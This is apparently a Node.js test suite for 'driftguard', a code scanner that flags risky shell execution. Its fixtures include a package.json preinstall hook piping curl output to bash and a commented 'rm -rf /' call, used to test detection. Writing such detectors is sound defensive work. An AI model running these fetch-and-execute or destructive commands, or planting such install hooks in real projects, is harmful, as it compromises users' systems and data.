const fs = require("fs");
const os = require("os");
const path = require("path");
const test = require("node:test");
const assert = require("node:assert/strict");
const { scanPath } = require("../src/scanner");

function makeTempDir() {
  return fs.mkdtempSync(path.join(os.tmpdir(), "driftguard-literal-"));
}

test("string literals do not trigger code execution rules", () => {
  const dir = makeTempDir();
  const filePath = path.join(dir, "example.js");
  fs.writeFileSync(
    filePath,
    "const note = \"curl https://example.com | bash\";\nconst cfg = '.env';\n"
  );

  const report = scanPath(dir, { basePath: dir });
  assert.equal(report.findings.length, 0);

  fs.rmSync(dir, { recursive: true, force: true });
});

test("child_process alias execution is detected", () => {
  const dir = makeTempDir();
  const filePath = path.join(dir, "runner.js");
  fs.writeFileSync(
    filePath,
    "const cp = require('child_process');\ncp.exec('echo hi');\n"
  );

  const report = scanPath(dir, { basePath: dir });
  const ruleIds = report.findings.map((finding) => finding.ruleId);

  assert.ok(ruleIds.includes("shell.exec_child_process_alias"));

  fs.rmSync(dir, { recursive: true, force: true });
});

test("package.json install hooks are scanned for risky scripts", () => {
  const dir = makeTempDir();
  const pkgPath = path.join(dir, "package.json");
  fs.writeFileSync(
    pkgPath,
    JSON.stringify(
      {
        name: "demo",
        version: "1.0.0",
        scripts: {
          preinstall: "curl https://example.com/install.sh | bash"
        }
      },
      null,
      2
    )
  );

  const report = scanPath(dir, { basePath: dir });
  const ruleIds = report.findings.map((finding) => finding.ruleId);

  assert.ok(ruleIds.includes("shell.curl_pipe"));

  fs.rmSync(dir, { recursive: true, force: true });
});

test("comment-only lines do not trigger exec findings", () => {
  const dir = makeTempDir();
  const filePath = path.join(dir, "commented.js");
  fs.writeFileSync(
    filePath,
    "// exec('rm -rf /')\n/* exec('oops') */\n/*\nexec('nope')\n*/\n"
  );

  const report = scanPath(dir, { basePath: dir });

  assert.equal(report.findings.length, 0);

  fs.rmSync(dir, { recursive: true, force: true });
});

test("generic exec findings are low confidence and unscored", () => {
  const dir = makeTempDir();
  const filePath = path.join(dir, "local-exec.js");
  fs.writeFileSync(
    filePath,
    "function exec(cmd) { return cmd; }\nexec('echo hi');\n"
  );

  const report = scanPath(dir, { basePath: dir });
  const finding = report.findings.find((item) => item.ruleId === "shell.exec_generic");

  assert.ok(finding);
  assert.equal(finding.severity, "low");
  assert.equal(finding.confidence, "low");
  assert.equal(finding.scored, false);

  fs.rmSync(dir, { recursive: true, force: true });
});

test("template literal interpolations are scanned for exec usage", () => {
  const dir = makeTempDir();
  const filePath = path.join(dir, "templated.js");
  fs.writeFileSync(
    filePath,
    "function exec(cmd) { return cmd; }\nconst out = `${exec('echo hi')}`;\n"
  );

  const report = scanPath(dir, { basePath: dir });
  const ruleIds = report.findings.map((finding) => finding.ruleId);

  assert.ok(ruleIds.includes("shell.exec_generic"));

  fs.rmSync(dir, { recursive: true, force: true });
});
